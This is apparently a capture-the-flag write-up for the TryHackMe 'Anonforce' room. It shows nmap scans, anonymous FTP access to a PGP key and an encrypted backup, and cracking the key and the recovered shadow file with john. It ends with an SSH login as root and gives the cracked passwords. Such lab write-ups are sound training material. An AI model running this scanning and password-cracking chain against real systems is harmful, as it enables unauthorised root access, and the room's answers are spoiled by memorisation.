# Anonforce

**Room Link:** [https://tryhackme.com/room/bsidesgtanonforce](https://tryhackme.com/room/bsidesgtanonforce)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

### TCP/21 - FTP

Anonymous login is enabled. There was a folder called notread with a pgp file.

**Kali**

<pre><code><strong>ftp $VICTIM
</strong><strong>> cd notread
</strong><strong>> mget *
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

I used john to crack the private.asc file

**Kali**

```
/opt/john/gpg2john private.asc > pgp.hash
john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gpg --import private.asc 
Password: xbox360
```

<figure><img src="../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

I was able to decrypt backup.pgp which had the shadow file

**Kali**

```
gpg --decrypt backup.pgp 
Password: xbox360
```

<figure><img src="../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

I copied the above shadow file and tried cracking this file which gave me roots password.

**Kali**

```
john pass.txt  --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh root@$VICTIM
Password: hikari
```
